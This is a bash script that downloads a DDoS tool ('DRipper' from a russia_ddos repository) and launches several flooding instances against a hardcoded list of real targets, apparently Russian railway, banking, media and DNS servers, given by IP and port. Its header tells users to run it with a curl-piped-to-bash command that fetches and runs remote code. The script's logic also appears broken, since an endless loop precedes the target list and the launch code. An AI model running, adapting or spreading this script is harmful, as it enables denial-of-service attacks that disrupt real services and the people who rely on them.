#!/bin/bash
##### Use next command in local linux terminal to run this script. #####
# >>>     curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper.sh | bash    <<<

##### This script will read and update database target every 10 min (default)
##### https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/Dripper_targets

##### To kill script just close terminal window.
##### OR
##### Open other terminal and run 'pkill -f DRipper.py'. Then in terminal with this script press CTRL+C.


# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git
fi

# How many copies of DRipper would be launched
# Low number is counter-productive because some sites might go down fast, so script won't do any work.
# Somewhere beetween 4 and 8 targets is good starting point.
# With high number of copies console output will be messy because all instances of DRipper use same terminal.
num_of_targets=8


# Restart DRipper.py every N seconds (600s = 10m, 1800s = 30m, 3600s = 60m)
restart_time=600

while true
do
   
   # Download latest version of DDripper.
   cd ~
   rm -rf russia_ddos
   git clone https://github.com/alexmon1989/russia_ddos.git
   cd russia_ddos
   pip install -r requirements.txt


   # Restart DRipper_main after N seconds (default 600s = 10m)
   sleep $restart_time
   pkill -f DRipper.py
done





declare -a targets
###################### LIST OF TARGETS #########################
targets[0]="193.104.87.251 80 tcp"       #РЖД
targets[1]="194.84.25.50 80 tcp"         #РЖД
targets[2]="5.188.56.124 22 tcp"         #админ сервер ВТБ
targets[3]="194.54.14.131 4477 tcp"      #порт додатку сбера
targets[4]="rt.com 80 tcp"               #rt.com
targets[5]="rt.com 443 tcp"              #rt.com
targets[6]="5.61.23.11 80 tcp"           #ok.ru
targets[7]="195.208.109.58 80 tcp"       ##acs.vendorcert.mirconnect.ru
targets[8]="195.208.109.58 443 tcp"      #acs.vendorcert.mirconnect.ru
targets[9]="217.175.155.100 53 udp"      #DNS'ки РЖД.ру
targets[10]="217.175.155.12 53 udp"      #DNS'ки РЖД.ру
targets[11]="217.175.140.71 53 udp"      #DNS'ки РЖД.ру
################################################################
list_size=${#targets[*]}

# Get multiple random numbers to choose multiple targets from "targets" array
random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)

# Launch several copies of DRipper.
for i in $(seq 1 $num_of_targets)
do
             # Get address, port and protocol from pre-selected target
             addr=$(echo ${targets[i]} | awk '{print $1}')
             port=$(echo ${targets[i]} | awk '{print $2}')
             prot=$(echo ${targets[i]} | awk '{print $3}')
            
             # Launch DRipper
             python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
done
